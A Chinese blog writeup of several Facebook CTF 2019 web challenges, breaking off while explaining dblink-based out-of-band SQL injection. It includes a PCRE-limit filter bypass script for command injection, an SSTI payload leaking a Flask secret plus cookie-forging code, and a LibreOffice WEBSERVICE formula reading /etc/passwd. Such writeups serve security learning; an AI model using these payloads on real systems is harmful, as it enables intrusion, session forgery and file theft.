<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>fbctf2019 · Damn1t's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.png"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/logo.png"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Damn1t</div><div class="profile-signature">for you I bleed myself dry</div><div class="friends"><div>FRIENDS</div><span><a href="//www.baidu.com" target="_black">baidu</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Damn1t's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">fbctf2019</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-06-12</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="ctf"> ctf</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="Facebook-ctf-2019"><a href="#Facebook-ctf-2019" class="headerlink" title="Facebook ctf 2019"></a>Facebook ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="rceservice"><a href="#rceservice" class="headerlink" title="rceservice"></a>rceservice</h3><p>题目描述：</p>
<blockquote>
<p>We created this web interface to run commands on our servers, but since we haven’t figured out how to secure it yet we only let you run ‘ls’</p>
<p><a href="http://challenges.fbctf.com:8085" target="_blank" rel="noopener">http://challenges.fbctf.com:8085</a></p>
<p>(This problem does not require any brute force or scanning.<br>We will ban your team if we detect brute force or scanning).</p>
</blockquote>
<p>要求用<code>json</code>格式传送payload<br><img src="https://ramadistra.dev/static/69bcde5f2a66779950b04b31626c4e7a/92980/initial.webp" alt=""></p>
<p>我们尝试<code>ls</code>：<code>{&quot;cmd&quot;:&quot;ls&quot;}</code></p>
<p><img src="https://ramadistra.dev/static/ef292e7c05d67c2b8f563690c770eb69/889a8/ls.webp" alt=""></p>
<p>题目源码：<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv('PATH=/home/rceservice/jail');</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (isset($_REQUEST['cmd'])) &#123;</span><br><span class="line">  $json = $_REQUEST['cmd'];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';</span><br><span class="line">  &#125; elseif (preg_match('/^.*(alias|<span class="type">bg</span>|<span class="type">bind</span>|<span class="type">break</span>|<span class="type">builtin</span>|<span class="type">case</span>|<span class="type">cd</span>|<span class="type">command</span>|<span class="type">compgen</span>|<span class="type">complete</span>|<span class="type">continue</span>|<span class="type">declare</span>|<span class="type">dirs</span>|<span class="type">disown</span>|<span class="type">echo</span>|<span class="type">enable</span>|<span class="type">eval</span>|<span class="type">exec</span>|<span class="type">exit</span>|<span class="type">export</span>|<span class="type">fc</span>|<span class="type">fg</span>|<span class="type">getopts</span>|<span class="type">hash</span>|<span class="type">help</span>|<span class="type">history</span>|<span class="type">if</span>|<span class="type">jobs</span>|<span class="type">kill</span>|<span class="type">let</span>|<span class="type">local</span>|<span class="type">logout</span>|<span class="type">popd</span>|<span class="type">printf</span>|<span class="type">pushd</span>|<span class="type">pwd</span>|<span class="type">read</span>|<span class="type">readonly</span>|<span class="type">return</span>|<span class="type">set</span>|<span class="type">shift</span>|<span class="type">shopt</span>|<span class="type">source</span>|<span class="type">suspend</span>|<span class="type">test</span>|<span class="type">times</span>|<span class="type">trap</span>|<span class="type">type</span>|<span class="type">typeset</span>|<span class="type">ulimit</span>|<span class="type">umask</span>|<span class="type">unalias</span>|<span class="type">unset</span>|<span class="type">until</span>|<span class="type">wait</span>|<span class="type">while</span>|<span class="type">[\x00</span>-\x1FA-Z0<span class="number">-9</span>!#-\/;-@\[-`|<span class="type">~\x7F</span>]+).*$/', $json)) &#123;</span><br><span class="line">    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo 'Attempting to run command:&lt;br/&gt;';</span><br><span class="line">    $cmd = json_decode($json, true)['cmd'];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      echo 'Invalid input';</span><br><span class="line">    &#125;</span><br><span class="line">    echo '&lt;br/&gt;&lt;br/&gt;';</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>暴躁过滤，在线砍人<br>但是我们看到了<code>preg_match</code>,就会想到p神曾经提到的PRCE，利用如下的exp：<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="title">payload</span> = '&#123;<span class="string">"cmd"</span>:<span class="string">"/bin/cat /home/rceservice/flag"</span>,<span class="string">"zz"</span>:<span class="string">"' + "</span>a<span class="string">"*(1000000) + '"</span>&#125;'</span><br><span class="line"></span><br><span class="line"><span class="title">res</span> = requests.post(<span class="string">"http://challenges.fbctf.com:8085/"</span>, <span class="class"><span class="keyword">data</span>=&#123;"<span class="title">cmd</span>":<span class="title">payload</span>&#125;)</span></span><br><span class="line"><span class="title">print</span>(res.text)</span><br></pre></td></tr></table></figure></p>
<p>另一种方法，同样是<code>preg_match</code>的问题，由于它会努力去匹配第一行，所以我们可以利用<strong>多行</strong>的方法</p>
<p><img src="https://i.loli.net/2019/06/10/5cfe6008e1fb886158.png" alt=""></p>
<p>尝试直接<code>cat</code>，但是返回了空白<br>我们返回去查看源代码：<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，jail应用于当前环境，又根据题目描述的提示–“只允许执行ls命令”，即jail包含了执行<code>ls</code>的二进制文件，所以我们可以直接拉出<code>cat</code>的路径：<code>&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;</code></p>
<blockquote>
<p>注：Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p>
</blockquote>
<h3 id="events"><a href="#events" class="headerlink" title="events"></a>events</h3><p>题目描述：</p>
<blockquote>
<p>I heard cookies and string formatting are safe in 2019?</p>
<p><a href="http://challenges.fbctf.com:8083" target="_blank" rel="noopener">http://challenges.fbctf.com:8083</a></p>
<p>(This problem does not require any brute force or scanning. We will ban your team if we detect brute force or scanning).</p>
</blockquote>
<p>登录<br><img src="https://i.loli.net/2019/06/10/5cfe6bab2297446330.png" alt=""></p>
<p>观察cookie：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ImEi<span class="selector-class">.XP5j-w</span><span class="selector-class">.rHcMilGKzEg1FYfcEOR6iqa-B9A</span></span><br></pre></td></tr></table></figure></p>
<p>似乎有三段，但加密方式未知，密钥未知<br>我们尝试提交数据，注意到有三个参数需要提交：<br><img src="https://i.loli.net/2019/06/10/5cfe6cc46116a77936.png" alt=""></p>
<p>既然提示了<code>cookie</code>和<code>string format</code>，admin是未允许的状态，所以思路是篡改cookie，伪装为admin，继而拿到flag，通常有一个思路是：利用SSTI，获取密钥，然后重新签名生成cookie。所以如何利用SSTI呢？<br>通过一番尝试，三个参数中，<code>event_important</code>是可利用点</p>
<ul>
<li>我们输入<code>__dict__</code>，成功回显</li>
</ul>
<p><img src="https://i.loli.net/2019/06/10/5cfe7273070fc54701.png" alt=""></p>
<ul>
<li><p>查找配置文件：<code>__class__.__init__.__globals__[app].config</code><br><img src="https://i.loli.net/2019/06/10/5cfe73cb3856843642.png" alt=""></p>
</li>
<li><p>于是进行签名</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">b'fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y'</span></span><br><span class="line"></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    print(session_serializer.dumps(<span class="string">"admin"</span>))</span><br><span class="line"></span><br><span class="line">index()</span><br></pre></td></tr></table></figure>
<p>将得到的cookie去修改原<code>user</code>的cookie即可得到flag</p>
<h3 id="products-manager"><a href="#products-manager" class="headerlink" title="products manager"></a>products manager</h3><p>题目给出了源码：</p>
<ul>
<li>在db.php中：</li>
</ul>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">INSERT INTO products VALUES('facebook', sha256(....), 'FLAG_HERE')<span class="comment">;</span></span><br><span class="line">INSERT INTO products VALUES('messenger', sha256(....), ....)<span class="comment">;</span></span><br><span class="line">INSERT INTO products VALUES('instagram', sha256(....), ....)<span class="comment">;</span></span><br><span class="line">INSERT INTO products VALUES('whatsapp', sha256(....), ....)<span class="comment">;</span></span><br><span class="line">INSERT INTO products VALUES('oculus-rift', sha256(....), ....)<span class="comment">;</span></span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p>给出了表结构，且提示很明显，再看主页面：<br><img src="https://i.loli.net/2019/06/11/5cfe8685b49df61035.png" alt=""></p>
<p>三个功能，add是添加产品<br><img src="https://i.loli.net/2019/06/11/5cfe86c76c0c145917.png" alt=""></p>
<p>view可以查询<br><img src="https://i.loli.net/2019/06/11/5cfe8707a0af441607.png" alt=""><br>我们再查看view.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($name) &amp;&amp; $name !== <span class="string">""</span></span><br><span class="line">      &amp;&amp; <span class="keyword">isset</span>($secret) &amp;&amp; $secret !== <span class="string">""</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (check_name_secret($name, hash(<span class="string">'sha256'</span>, $secret)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Incorrect name or secret, please try again"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $product = get_product($name);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Product details:"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;ul&gt;&lt;li&gt;"</span> . htmlentities($product[<span class="string">'name'</span>]) . <span class="string">"&lt;/li&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;li&gt;"</span> . htmlentities($product[<span class="string">'description'</span>]) . <span class="string">"&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure></p>
<p>/db.php::check_name_secret源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_name_secret</span><span class="params">($name, $secret)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $db;</span><br><span class="line">  $valid = <span class="keyword">false</span>;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    <span class="string">"SELECT name FROM products WHERE name = ? AND secret = ?"</span></span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(<span class="string">"ss"</span>, $name, $secret);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  <span class="keyword">if</span> ($res-&gt;fetch_assoc() !== <span class="keyword">null</span>) &#123;</span><br><span class="line">    $valid = <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  <span class="keyword">return</span> $valid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>/db.php::get_product源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_product</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $db;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    <span class="string">"SELECT name, description FROM products WHERE name = ?"</span></span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(<span class="string">"s"</span>, $name);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  $product = $res-&gt;fetch_assoc();</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  <span class="keyword">return</span> $product;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>check的时候会将name和secret一并查询，但返回product时只查询name，所以此时便有了可利用点<br>这里涉及到mysql的一个问题，查询的时候将会忽略字符串尾部的空格<br><img src="https://i.loli.net/2019/06/11/5cfe897b3282f80821.png" alt=""></p>
<p>于是我们可以添加一个facebook尾部带n个空格的product，添加成功后再进行查询，便能得到flag</p>
<h3 id="pdfme"><a href="#pdfme" class="headerlink" title="pdfme"></a>pdfme</h3><p><img src="https://github.com/AidanFray/CTF_Writeups/raw/master/2019/FacebookCTF/pdfme/images/start.png" alt=""><br>只能上传<code>.fods</code>文件，在网上找了个：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml <span class="keyword">version</span>=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span><br><span class="line">&lt;office:document xmln<span class="variable">s:office</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:office:1.0"</span>  xmln<span class="variable">s:style</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:style:1.0"</span>  xmln<span class="variable">s:text</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:text:1.0"</span>  xmln<span class="variable">s:table</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:table:1.0"</span>  xmln<span class="variable">s:draw</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:drawing:1.0"</span>  xmln<span class="variable">s:fo</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0"</span>  xmln<span class="variable">s:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span>  xmln<span class="variable">s:dc</span>=<span class="string">"http://purl.org/dc/elements/1.1/"</span>  xmln<span class="variable">s:meta</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:meta:1.0"</span>  xmln<span class="variable">s:number</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0"</span>  xmln<span class="variable">s:presentation</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:presentation:1.0"</span>  xmln<span class="variable">s:svg</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0"</span>  xmln<span class="variable">s:chart</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:chart:1.0"</span>  xmln<span class="variable">s:dr3d</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0"</span>  xmln<span class="variable">s:math</span>=<span class="string">"http://www.w3.org/1998/Math/MathML"</span>  xmln<span class="variable">s:form</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:form:1.0"</span>  xmln<span class="variable">s:script</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:script:1.0"</span>  xmln<span class="variable">s:config</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:config:1.0"</span>  xmln<span class="variable">s:ooo</span>=<span class="string">"http://openoffice.org/2004/office"</span>  xmln<span class="variable">s:ooow</span>=<span class="string">"http://openoffice.org/2004/writer"</span>  xmln<span class="variable">s:oooc</span>=<span class="string">"http://openoffice.org/2004/calc"</span>  xmln<span class="variable">s:dom</span>=<span class="string">"http://www.w3.org/2001/xml-events"</span>  xmln<span class="variable">s:xforms</span>=<span class="string">"http://www.w3.org/2002/xforms"</span>  xmln<span class="variable">s:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span>  xmln<span class="variable">s:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span>  xmln<span class="variable">s:rpt</span>=<span class="string">"http://openoffice.org/2005/report"</span>  xmln<span class="variable">s:of</span>=<span class="string">"urn:oasis:names:tc:opendocument:xmlns:of:1.2"</span>  xmln<span class="variable">s:xhtml</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>  xmln<span class="variable">s:grddl</span>=<span class="string">"http://www.w3.org/2003/g/data-view#"</span>  xmln<span class="variable">s:tableooo</span>=<span class="string">"http://openoffice.org/2009/table"</span>  xmln<span class="variable">s:drawooo</span>=<span class="string">"http://openoffice.org/2010/draw"</span>  xmln<span class="variable">s:calcext</span>=<span class="string">"urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0"</span>  xmln<span class="variable">s:loext</span>=<span class="string">"urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0"</span>  xmln<span class="variable">s:field</span>=<span class="string">"urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0"</span>  xmln<span class="variable">s:formx</span>=<span class="string">"urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0"</span>  xmln<span class="variable">s:css3t</span>=<span class="string">"http://www.w3.org/TR/css3-text/"</span> office:<span class="keyword">version</span>=<span class="string">"1.2"</span> office:mimetype=<span class="string">"application/vnd.oasis.opendocument.spreadsheet"</span>&gt;</span><br><span class="line">    &lt;office:body&gt;</span><br><span class="line">        &lt;office:spreadsheet&gt;</span><br><span class="line">            &lt;table:table table:name=<span class="string">"1"</span>&gt;</span><br><span class="line">                &lt;table:table-column/&gt;</span><br><span class="line">                &lt;table:table-row&gt;</span><br><span class="line">                    &lt;table:table-cell office:value-<span class="built_in">type</span>=<span class="string">"string"</span> calcex<span class="variable">t:value</span>-<span class="built_in">type</span>=<span class="string">"string"</span>&gt;</span><br><span class="line">                        &lt;tex<span class="variable">t:p</span>&gt;TEXT&lt;/tex<span class="variable">t:p</span>&gt;</span><br><span class="line">                    &lt;/table:table-cell&gt;</span><br><span class="line">                &lt;/table:table-row&gt;</span><br><span class="line">                &lt;table:table-row&gt;&lt;/table:table-row&gt;</span><br><span class="line">            &lt;/table:table&gt;</span><br><span class="line">            &lt;table:named-expressions/&gt;</span><br><span class="line">        &lt;/office:spreadsheet&gt;</span><br><span class="line">    &lt;/office:body&gt;</span><br><span class="line">&lt;/office:document&gt;</span><br></pre></td></tr></table></figure></p>
<p>他会渲染为pdf：</p>
<p><img src="https://i.loli.net/2019/06/11/5cfe8ff9c303f36290.png" alt=""><br>将pdf下载下来，利用exiftool查看文件信息：<br><img src="https://i.loli.net/2019/06/11/5cff2e6c83e7924512.png" alt=""><br>注意到<strong>libreoffice</strong>，查找相关漏洞，最后落到了<a href="https://www.exploit-db.com/exploits/44022" target="_blank" rel="noopener">CVE-2018-6871</a>，差不多是协议的问题：</p>
<blockquote>
<p>For protocols that are not supported, such as ftp: // or file: //, WEBSERVICE returns the #VALUE! error value.</p>
<p>In LibreOffice, these restrictions are not implemented before 5.4.5/6.0.1</p>
</blockquote>
<p>将<code>table:table-cell</code>这一部分进行替换，改为：<br><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;<span class="keyword">table</span>:<span class="keyword">table</span>-<span class="keyword">cell</span> </span><br><span class="line">     <span class="keyword">table</span>:formula=<span class="string">"of:=COM.MICROSOFT.WEBSERVICE(&amp;quot;/etc/passwd&amp;quot;)"</span> </span><br><span class="line">     office:value-<span class="keyword">type</span>=<span class="string">"string"</span> </span><br><span class="line">     office:<span class="keyword">string</span>-value=<span class="string">""</span> </span><br><span class="line">     calcext:value-<span class="keyword">type</span>=<span class="string">"string"</span>&gt;</span><br><span class="line">  &lt;text:p&gt;#VALUE!&lt;/text:p&gt;</span><br><span class="line">&lt;/<span class="keyword">table</span>:<span class="keyword">table</span>-<span class="keyword">cell</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到：<br><img src="https://github.com/AidanFray/CTF_Writeups/raw/master/2019/FacebookCTF/pdfme/images/passwd.png" alt=""><br>根据给出的用户，于是我们尝试查询<code>/home/libreoffice_admin/flag</code>,最终读到flag<br><img src="https://i.loli.net/2019/06/11/5cff3642cb56094273.png" alt=""></p>
<h3 id="hr-admin-module"><a href="#hr-admin-module" class="headerlink" title="hr_admin_module"></a>hr_admin_module</h3><p>题目描述：</p>
<blockquote>
<p>While tying down the application the developer may have had trouble revoking the permission on one or two functions. Let’s hope this got sorted. At least he made sure the site feels really fast.</p>
<p><a href="http://challenges.fbctf.com:8081" target="_blank" rel="noopener">http://challenges.fbctf.com:8081</a></p>
</blockquote>
<p><img src="https://i.loli.net/2019/06/12/5d00bb9fc0c9c75902.png" alt=""><br>有两个搜索框，从error似乎给出了一些提示，数据库为<code>postgresql</code>，<code>user</code>框禁止了输入，于是尝试利用<code>employees</code>框，但没卵用，关注地址栏：<br><img src="https://i.loli.net/2019/06/12/5d00bc9e9c61624776.png" alt=""></p>
<p>尝试将<code>employee</code>改为<code>user</code>，输入<code>admin&#39;</code>，奏效了，弹出warning：</p>
<blockquote>
<p>This is a warning alert—check it out!</p>
</blockquote>
<p>尝试输入<code>secret</code>，同样弹出上述警报<br>输入<code>admin%27--</code>，无警报</p>
<p>fuzz一阵，会发现回显只有有无warning的区别，但尝试利用<code>pg_sleep</code>，返回结果没有时延，所以我们可以猜测后台是异步执行，且一般盲注不起效果</p>
<p><strong>带外注入（OOB）：</strong></p>
<blockquote>
<p>带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用所谓的盲目(blind)的漏洞。在这种盲目的漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功是基于防火墙出站规则的，即允许存在漏洞的系统和外围防火墙的出站请求</p>
</blockquote>
<p>我们大致有两种方式：</p>
<ol>
<li>dnslog，搭建dns服务器，将域名指向自己的服务器，利用dns进行解析，然后请求自己的二级或三级域名，在dns解析日志中去查看他们</li>
<li>因为<code>dblink_connect</code>可用，我们可以尝试搭建一个<code>postgresql</code>服务，然后建立一个远程会话连接，连接到我们的<code>psql</code>服务，监听服务端口，查看请求包的明文信息</li>
</ol>
<p>第二个方法似乎更为简单</p>
<p><code>dblink</code>是一个支持在一个数据库会话中连接到其他PostgreSQL数据库的模块。<br><code>dblink_connect</code> – 打开一个到远程数据库的持久连接</p>
